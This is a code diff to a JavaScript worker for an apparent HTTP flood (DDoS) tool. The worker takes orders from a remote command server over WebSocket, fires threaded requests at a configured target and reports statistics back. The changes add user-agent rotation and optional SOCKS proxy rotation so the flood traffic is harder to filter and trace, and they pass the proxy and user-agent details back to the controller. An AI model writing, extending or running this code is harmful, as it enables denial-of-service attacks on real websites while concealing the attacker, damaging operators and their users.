@@ -79,6 +79,8 @@ let currentConfig = null;
 let attackStartTime = null;
 let keepAliveInterval = null;
 let http2Sessions = new Map();
+let currentUserAgent = '';
+let currentProxy = null;
 
 function connect() {
   console.log('[*] Connecting to command server...');
@@ -94,7 +96,16 @@ function connect() {
   ws.on('open', () => {
     clearTimeout(connectionTimeout);
     log('✓ Connected to command server');
-    ws.send(JSON.stringify({ type: 'identify', role: 'worker' }));
+    
+    // Send worker info including loaded resources
+    ws.send(JSON.stringify({ 
+      type: 'identify', 
+      role: 'worker',
+      info: {
+        userAgents: userAgents.length,
+        proxies: proxies.length
+      }
+    }));
     
     if (keepAliveInterval) clearInterval(keepAliveInterval);
     keepAliveInterval = setInterval(() => {
@@ -150,9 +161,18 @@ async function startAttack(config) {
   stats = { sent: 0, success: 0, failed: 0 };
   attackStartTime = Date.now();
   
+  // Set initial user agent and proxy
+  currentUserAgent = getRandomUserAgent();
+  currentProxy = config.useProxy ? getRandomProxy() : null;
+  
   log(`🎯 Target: ${config.target}`);
   log(`📊 Duration: ${config.duration}s | Threads: ${config.threads} | Delay: ${config.delay}ms`);
   log(`⚡ Attack Mode: ${config.attackMode || 'standard'}`);
+  log(`👤 User-Agent Rotation: ${config.rotateUserAgent ? 'ON' : 'OFF'} (${userAgents.length} loaded)`);
+  log(`🔄 Proxy: ${config.useProxy ? 'ON' : 'OFF'} (${proxies.length} loaded)`);
+  if (currentProxy) {
+    log(`📍 Using Proxy: ${currentProxy.host}:${currentProxy.port}`);
+  }
   log('🚀 ATTACK STARTED');
   
   const endTime = attackStartTime + (config.duration * 1000);
@@ -260,8 +280,13 @@ function getRandomProxy() {
 }
 
 function getRandomHeaders(config) {
+  // Rotate user agent if enabled
+  if (config.rotateUserAgent) {
+    currentUserAgent = getRandomUserAgent();
+  }
+  
   const headers = {
-    'User-Agent': getRandomUserAgent(),
+    'User-Agent': currentUserAgent,
     'Accept': '*/*',
     'Accept-Language': 'en-US,en;q=0.9',
     'Accept-Encoding': 'gzip, deflate, br',
@@ -410,7 +435,12 @@ function sendRequestNoWait(config, resolvedIP) {
     const protocol = url.protocol === 'https:' ? https : http;
     const agent = url.protocol === 'https:' ? httpsAgent : httpAgent;
     const mode = config.attackMode || 'standard';
-    const proxy = getRandomProxy();
+    
+    // Get proxy if enabled
+    const proxy = config.useProxy ? getRandomProxy() : null;
+    if (proxy && config.useProxy) {
+      currentProxy = proxy;
+    }
     
     const options = {
       hostname: resolvedIP || url.hostname,
@@ -438,7 +468,7 @@ function sendRequestNoWait(config, resolvedIP) {
     }
     
     // Proxy support
-    if (proxy) {
+    if (proxy && config.useProxy) {
       const socksOptions = {
         proxy: {
           host: proxy.host,
@@ -530,7 +560,11 @@ function reportStats() {
   if (ws && ws.readyState === WebSocket.OPEN) {
     ws.send(JSON.stringify({
       type: 'stats',
-      stats: stats
+      stats: stats,
+      currentUA: currentUserAgent.substring(0, 50) + '...',
+      currentProxy: currentProxy ? `${currentProxy.host}:${currentProxy.port}` : 'Direct',
+      uaCount: userAgents.length,
+      proxyCount: proxies.length
     }));
   }
 }
